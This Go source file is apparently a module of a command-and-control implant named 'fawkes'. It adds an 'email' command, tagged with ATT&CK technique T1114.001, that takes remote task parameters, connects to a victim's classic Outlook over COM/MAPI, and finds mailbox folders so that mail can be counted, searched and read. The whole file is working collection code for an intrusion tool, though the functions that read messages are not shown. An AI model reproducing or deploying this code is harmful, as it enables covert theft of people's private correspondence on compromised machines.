//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"

	"fawkes/pkg/structs"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// EmailCommand provides Outlook COM-based email access (T1114.001).
type EmailCommand struct{}

func (c *EmailCommand) Name() string        { return "email" }
func (c *EmailCommand) Description() string { return "Access Outlook mailbox via COM (T1114.001)" }

type emailArgs struct {
	Action  string `json:"action"`  // count, search, read, folders
	Folder  string `json:"folder"`  // folder name (default: Inbox)
	Query   string `json:"query"`   // search keyword for search action
	Index   int    `json:"index"`   // message index for read action (1-based)
	Count   int    `json:"count"`   // max results to return (default: 10)
	Headers bool   `json:"headers"` // if true, show headers only (no body)
}

// Outlook folder constants (OlDefaultFolders enumeration).
const (
	olFolderInbox        = 6
	olFolderOutbox       = 4
	olFolderSentMail     = 5
	olFolderDrafts       = 16
	olFolderDeletedItems = 3
	olFolderJunk         = 23
)

func (c *EmailCommand) Execute(task structs.Task) structs.CommandResult {
	var args emailArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Count <= 0 {
		args.Count = 10
	}

	switch strings.ToLower(args.Action) {
	case "count":
		return emailCount(args)
	case "search":
		return emailSearch(args)
	case "read":
		return emailRead(args)
	case "folders":
		return emailFolders()
	default:
		return errorf("Unknown action '%s'. Valid: count, search, read, folders", args.Action)
	}
}

// outlookConnection holds the COM objects for Outlook access.
type outlookConnection struct {
	app       *ole.IDispatch
	namespace *ole.IDispatch
}

// outlookConnect initializes COM and connects to Outlook.
// Returns the connection and a cleanup function.
func outlookConnect() (*outlookConnection, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, fmt.Errorf("CoInitializeEx failed: %v", err)
		}
	}

	unknown, err := oleutil.CreateObject("Outlook.Application")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		// Detect "New Outlook" (UWP/WebView2) which lacks COM support
		msg := "failed to create Outlook.Application: %v. "
		msg += "Classic Outlook (Microsoft 365/Office) is required — "
		msg += "the new Outlook for Windows (UWP) does not support COM automation"
		return nil, nil, fmt.Errorf(msg, err)
	}

	app, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to query IDispatch on Outlook.Application: %v", err)
	}

	nsResult, err := oleutil.CallMethod(app, "GetNamespace", "MAPI")
	if err != nil {
		app.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("GetNamespace(MAPI) failed: %v", err)
	}
	namespace := nsResult.ToIDispatch()

	conn := &outlookConnection{
		app:       app,
		namespace: namespace,
	}

	cleanup := func() {
		namespace.Release()
		app.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return conn, cleanup, nil
}

// getFolder returns the specified folder from the MAPI namespace.
// If folderName is empty, returns the Inbox.
func (conn *outlookConnection) getFolder(folderName string) (*ole.IDispatch, error) {
	folderID := olFolderInbox
	switch strings.ToLower(folderName) {
	case "", "inbox":
		folderID = olFolderInbox
	case "outbox":
		folderID = olFolderOutbox
	case "sent", "sentmail", "sent mail":
		folderID = olFolderSentMail
	case "drafts":
		folderID = olFolderDrafts
	case "deleted", "deleteditems", "deleted items":
		folderID = olFolderDeletedItems
	case "junk":
		folderID = olFolderJunk
	default:
		// Try by name — GetDefaultFolder only works for known IDs.
		// For custom folders, use Folders collection on root.
		rootResult, err := oleutil.GetProperty(conn.namespace, "Folders")
		if err != nil {
			return nil, fmt.Errorf("failed to get root folders: %v", err)
		}
		rootFolders := rootResult.ToIDispatch()
		defer rootFolders.Release()

		return findFolderByName(rootFolders, folderName)
	}

	result, err := oleutil.CallMethod(conn.namespace, "GetDefaultFolder", folderID)
	if err != nil {
		return nil, fmt.Errorf("GetDefaultFolder(%d) failed: %v", folderID, err)
	}
	return result.ToIDispatch(), nil
}

// findFolderByName searches recursively through Outlook folder hierarchy.
func findFolderByName(folders *ole.IDispatch, name string) (*ole.IDispatch, error) {
	countResult, err := oleutil.GetProperty(folders, "Count")
	if err != nil {
		return nil, fmt.Errorf("failed to get folder count: %v", err)
	}
	count := int(countResult.Val)

	for i := 1; i <= count; i++ {
		itemResult, err := oleutil.CallMethod(folders, "Item", i)
		if err != nil {
			continue
		}
		folder := itemResult.ToIDispatch()

		nameResult, err := oleutil.GetProperty(folder, "Name")
		if err != nil {
			folder.Release()
			continue
		}
		folderName := nameResult.ToString()

		if strings.EqualFold(folderName, name) {
			return folder, nil
		}

		// Search subfolders
		subResult, err := oleutil.GetProperty(folder, "Folders")
		if err == nil {
			subFolders := subResult.ToIDispatch()
			found, err := findFolderByName(subFolders, name)
			subFolders.Release()
			if err == nil {
				folder.Release()
				return found, nil
			}
		}
		folder.Release()
	}

	return nil, fmt.Errorf("folder '%s' not found", name)
}
